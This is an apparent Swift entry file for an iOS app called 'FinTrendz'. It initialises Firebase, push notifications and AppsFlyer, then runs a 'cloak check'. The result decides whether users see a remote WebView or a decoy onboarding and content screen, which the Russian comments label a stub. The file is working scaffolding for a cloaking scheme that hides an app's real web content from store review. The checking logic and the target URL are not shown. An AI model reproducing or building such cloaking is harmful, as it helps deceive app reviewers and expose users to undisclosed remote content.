//
//  zm_854App.swift
//  FinTrendz
//
//  Created by Вячеслав on 1/25/26.
//

import SwiftUI
import CoreData
import FirebaseCore
import FirebaseMessaging
import AppsFlyerLib
import UserNotifications

@main
struct zm_854App: App {
    @StateObject private var cloakManager = CloakManager.shared

    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    
    var body: some Scene {
        WindowGroup {
            
            ZStack {
                if cloakManager.isLoading {
                    // Экран загрузки
                    ProgressView()
                } else {
                    if cloakManager.shouldShowWebView {
                        // Показываем WebView
                        WebSystemWrapper(url: cloakManager.finalURL)
                    } else {
                        // Показываем заглушку
                        if hasCompletedOnboarding {
                            ContentView()
                        } else {
                            OnboardingView()
                        }
                    }
                }
            }
            .task {
                // 1. Сначала запрашиваем разрешение на уведомления
                print("📱 Запрашиваем разрешение на push notifications...")
                let granted = await AppDelegate.requestPushNotifications()
                
                // 2. Даем время Firebase получить FCM токен (если разрешено)
                if granted {
                    print("⏳ Ожидаем получения FCM токена...")
                    try? await Task.sleep(nanoseconds: 2_000_000_000) // 2 секунды
                }
                
                // 3. Теперь запускаем проверку клоаки с fcm_token
                print("🚀 Запускаем проверку клоаки...")
                await cloakManager.performCloakCheck()
            }
        }
    }
}

class AppDelegate: NSObject, UIApplicationDelegate, UNUserNotificationCenterDelegate, MessagingDelegate {
    
    // MARK: - Static Method для запроса Push Notifications
    static func requestPushNotifications() async -> Bool {
        return await withCheckedContinuation { continuation in
            UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
                if granted {
                    print("✅ Push notifications authorized")
                    DispatchQueue.main.async {
                        UIApplication.shared.registerForRemoteNotifications()
                    }
                    continuation.resume(returning: true)
                } else {
                    if let error = error {
                        print("❌ Push notifications error: \(error)")
                    } else {
                        print("⚠️ Push notifications denied by user")
                    }
                    continuation.resume(returning: false)
                }
            }
        }
    }
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) -> Bool {
        
        // 1. Инициализация Firebase
        FirebaseApp.configure()
        print("✅ Firebase configured")
        
        // 2. Настройка Firebase Cloud Messaging
        Messaging.messaging().delegate = self
        UNUserNotificationCenter.current().delegate = self
        
        // Запрос разрешения на уведомления перенесен в момент открытия WebView
        
        // 3. Инициализация AppsFlyer
        // ВАЖНО: Замените "YOUR_DEV_KEY" на реальный ключ от AppsFlyer
        AppsFlyerLib.shared().appsFlyerDevKey = DataManagers().AppsFlyerDevKey
        AppsFlyerLib.shared().appleAppID = DataManagers().appID // Например: "123456789"
        
        // НЕ запрашиваем ConversionData, только инициализация
        AppsFlyerLib.shared().isDebug = true // Для отладки, в production поставить false
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)
        
        print("✅ AppsFlyer initialized")
        
        return true
    }
    
    // MARK: - APNs Registration
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        print("✅ APNs Device Token: \(deviceToken.map { String(format: "%02.2hhx", $0) }.joined())")
        
        // Передаем токен в Firebase
        Messaging.messaging().apnsToken = deviceToken
    }
    
    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print("❌ Failed to register for remote notifications: \(error)")
    }
    
    // MARK: - Firebase Messaging Delegate
    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        if let token = fcmToken {
            print("✅ FCM Token: \(token)")
            // Сохраняем токен для использования в клоаке
            UserDefaults.standard.set(token, forKey: "fcm_token")
        }
    }
    
    // MARK: - UNUserNotificationCenter Delegate
    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        completionHandler([.banner, .sound, .badge])
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        completionHandler()
    }
}
